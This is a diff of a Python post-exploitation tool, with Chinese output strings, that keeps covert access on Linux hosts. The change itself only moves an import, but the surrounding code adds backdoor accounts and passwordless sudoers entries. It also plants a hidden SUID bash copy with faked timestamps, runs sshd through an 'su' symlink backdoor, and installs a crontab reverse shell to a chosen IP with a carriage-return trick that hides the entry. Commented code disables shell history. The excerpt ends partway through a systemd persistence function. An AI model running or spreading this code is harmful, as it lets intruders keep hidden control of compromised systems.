@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: UTF-8 -*-
+import os
 def show():
     print(
         '''
@@ -19,7 +20,6 @@ def show():
     [7] 持久化反向Shell
     ''')
 # def history():
-#     import os
 #     os.system("export HISTCONTROL=ignorespace")
 #     os.system(" set +o history")
 #     id = os.popen("history | grep -n 'ignorespace' | awk -F: '{print $1}'").read().strip()
@@ -32,7 +32,6 @@ def show():
 #         print("关闭历史命令失败")
 
 def bDoorAdd(user):
-    import os
     a = int(os.popen(f"cat /etc/passwd | grep '{user}' | wc -l").read().strip())
     if a == 1:
         print(f"{user}账号已经存在")
@@ -45,7 +44,6 @@ def bDoorAdd(user):
             print("添加失败")
 
 def sudoAdd(user):
-    import os
     if int(os.popen(f"cat /etc/passwd | grep {user} | wc -l").read().strip()) == 1:
         os.system(f"echo '{user} ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
         c = int(os.popen(f"tail /etc/sudoers | grep '{user}' | wc -l").read().strip())
@@ -57,7 +55,6 @@ def sudoAdd(user):
         print("账号不存在")
 
 def hideBash():
-    import os
     if int(os.popen("ls -al /tmp | grep '.access_1og' | wc -l").read().strip()) == 0:
         os.system("cp /bin/bash /tmp/.access_1og && chmod 4755 /tmp/.access_1og")
         os.system("touch -r /bin/bash /tmp/.access_1og")
@@ -71,7 +68,6 @@ def hideBash():
     else:
         print("文件已经存在")
 def checkPort(port):
-    import os
     c = int(os.popen(f"netstat -anpt | grep '{port}' | wc -l").read().strip())
     if c >= 1:
         return 0
@@ -79,7 +75,6 @@ def checkPort(port):
         return 1
 
 def softLink(port):
-    import os
     if int(os.popen(f"find ./ -name 'su'| wc -l").read().strip()) == 0:
         os.system(f"ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort={port}")
         c = checkPort(port)
@@ -92,11 +87,9 @@ def softLink(port):
         print("文件已经存在")
 
 def Timing(ip, port):
-    import os
     os.system(f"(printf \"*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1';\rno crontab for `whoami`%100c\n\")|crontab -")
 
 def Pub():
-    import os
     c = int(os.popen("find ./ -name 'id_rsa.pub' | wc -l").read().strip())
     if c == 0:
         print("请先上传公钥到当前目录")
@@ -108,7 +101,6 @@ def Pub():
             print("写入失败")
 
 def persistShellWithSystemd(ip, port):
-    import os
 
     # 定义systemd服务文件内容
     service_content = f"""
